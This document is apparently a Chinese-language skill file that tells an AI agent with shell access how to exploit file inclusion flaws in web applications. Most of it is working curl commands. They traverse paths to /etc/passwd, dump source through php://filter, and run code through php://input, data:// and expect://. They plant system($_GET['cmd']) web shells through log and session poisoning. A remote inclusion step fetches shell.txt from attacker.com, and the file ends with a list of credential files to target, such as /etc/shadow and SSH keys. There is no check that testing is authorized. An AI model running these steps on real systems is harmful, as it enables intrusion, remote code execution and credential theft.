---
name: file-inclusion
description: "检测并利用文件包含漏洞（LFI/RFI/路径遍历），枚举可读敏感文件，测试过滤器绕过，通过日志污染或PHP伪协议链接到RCE。当目标存在文件读取、页面包含、模板加载、语言切换或文档下载功能时使用。"
allowed-tools: Bash, Read, Write
---

# 文件包含 (File Inclusion)

通过操纵文件路径参数，读取服务器敏感文件或执行恶意代码。

## 决策流程

```
发现文件参数 (file=, page=, path=, template=, lang=, include=)
  │
  ├─ 1. 基础路径遍历测试 → 读取 /etc/passwd 或 win.ini
  │     ├─ 成功 → 枚举敏感文件 (参考 SENSITIVE_FILES.md)
  │     └─ 失败 → 尝试绕过技术 (参考 BYPASSES.md)
  │
  ├─ 2. PHP伪协议测试 → php://filter 读取源码
  │     ├─ 成功 → 分析源码寻找更多漏洞入口
  │     └─ 失败 → 测试其他协议 (data://, expect://)
  │
  ├─ 3. LFI → RCE 提权
  │     ├─ 日志污染 (Apache/Nginx)
  │     ├─ php://input 直接执行
  │     ├─ Session 污染
  │     ├─ /proc/self/environ 注入
  │     └─ 文件上传 + LFI 组合
  │
  └─ 4. RFI 测试 (若 allow_url_include=On)
        └─ 远程加载恶意文件
```

## 常见指示器

- 文件参数: `file=`, `page=`, `path=`, `template=`, `lang=`, `include=`
- 语言/主题切换、文档下载、图片预览、模板加载、日志查看功能

## 阶段一: 检测与确认

### 步骤 1 — 基础路径遍历

```bash
# 标准路径遍历
curl -s "http://target.com/page?file=../../../etc/passwd"

# 绝对路径
curl -s "http://target.com/page?file=/etc/passwd"

# 空字节截断 (PHP < 5.3.4)
curl -s "http://target.com/page?file=../../../etc/passwd%00"
```

**验证检查点**: 响应中包含 `root:x:0:0` 表示成功。若无结果，参考 [BYPASSES.md](./BYPASSES.md) 尝试编码绕过和双写绕过。

### 步骤 2 — PHP 伪协议读源码

```bash
# Base64 编码读取源码 (避免执行)
curl -s "http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php"
```

**验证检查点**: 响应为 Base64 字符串，解码后得到 PHP 源码。检查源码中的数据库凭证、API密钥、其他包含路径。

### 步骤 3 — 代码执行协议

```bash
# php://input — POST 体作为 PHP 执行
curl -s "http://target.com/page?file=php://input" -d "<?php system('id'); ?>"

# data:// 协议
curl -s "http://target.com/page?file=data://text/plain,<?php system('id'); ?>"
curl -s "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="

# expect:// 协议 (需要 expect 扩展)
curl -s "http://target.com/page?file=expect://id"

# ZIP/PHAR 协议 (需要先上传包含 PHP 的压缩包)
curl -s "http://target.com/page?file=zip://path/to/file.zip%23shell.php"
curl -s "http://target.com/page?file=phar://path/to/file.phar/shell.php"
```

**验证检查点**: 响应包含 `uid=` 输出表示代码执行成功。

## 阶段二: LFI → RCE 提权

### 方法 A — 日志污染

```bash
# 步骤1: 注入 PHP 代码到 User-Agent
curl -s "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# 步骤2: 验证日志注入 — 确认 payload 已写入日志
curl -s "http://target.com/page?file=/var/log/apache2/access.log" | grep "system"
# 验证检查点: 应能在日志中看到注入的 PHP 代码片段

# 步骤3: 包含日志触发执行
curl -s "http://target.com/page?file=/var/log/apache2/access.log&cmd=id"
```

> 常见日志路径: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/httpd/access_log`。完整列表见 [SENSITIVE_FILES.md](./SENSITIVE_FILES.md)。

### 方法 B — Session 污染

```bash
# 步骤1: 在 session 可控字段（用户名等）注入 PHP 代码
# 步骤2: 获取 PHPSESSID (从 Cookie 中)
# 步骤3: 包含 session 文件
curl -s "http://target.com/page?file=/tmp/sess_<PHPSESSID>&cmd=id"
```

> Session 路径见 [SENSITIVE_FILES.md](./SENSITIVE_FILES.md)。

### 方法 C — /proc/self/environ 注入

```bash
# 步骤1: 注入代码到 User-Agent (会出现在环境变量 HTTP_USER_AGENT 中)
curl -s "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# 步骤2: 包含 environ 文件触发执行
curl -s "http://target.com/page?file=/proc/self/environ&cmd=id"
```

**验证检查点**: 响应包含命令输出（如 `uid=33(www-data)`）。

### 方法 D — 文件上传 + LFI 组合

```bash
# 步骤1: 上传包含 PHP 代码的文件（伪装为图片等允许类型）
# 步骤2: 确定上传路径
# 步骤3: 通过 LFI 包含上传的文件
curl -s "http://target.com/page?file=../uploads/shell.jpg"
```

## 阶段三: 远程文件包含 (RFI)

仅当 `allow_url_include=On` 时可用（PHP 默认关闭）。

```bash
# 基础 RFI
curl -s "http://target.com/page?file=http://attacker.com/shell.txt"

# 带截断
curl -s "http://target.com/page?file=http://attacker.com/shell.txt%00"
curl -s "http://target.com/page?file=http://attacker.com/shell.txt?"
```

**验证检查点**: 远程文件内容被包含并执行。若 `http://` 被过滤，参考 [BYPASSES.md](./BYPASSES.md) 中的协议绕过部分。

## 阶段四: 敏感文件枚举

确认文件包含可用后，系统性枚举目标上的敏感文件。

完整文件列表见 [SENSITIVE_FILES.md](./SENSITIVE_FILES.md)，优先级:
1. **凭证文件**: `/etc/shadow`, SSH密钥, 数据库配置
2. **应用源码**: `config.php`, `.env`, `wp-config.php`
3. **系统信息**: `/proc/version`, `/etc/hosts`, 环境变量
4. **日志文件**: 用于日志污染 RCE 或信息收集

## 最佳实践

1. **循序渐进**: 先基础遍历 → 协议测试 → 绕过技术 → RCE 提权
2. **每步验证**: 在进入下一阶段前确认当前步骤结果
3. **分析源码**: 读取到源码后优先分析，寻找更多攻击面
4. **记录路径**: 记录已确认可读的文件路径，供后续利用
5. **绕过参考**: 遇到过滤时查阅 [BYPASSES.md](./BYPASSES.md)
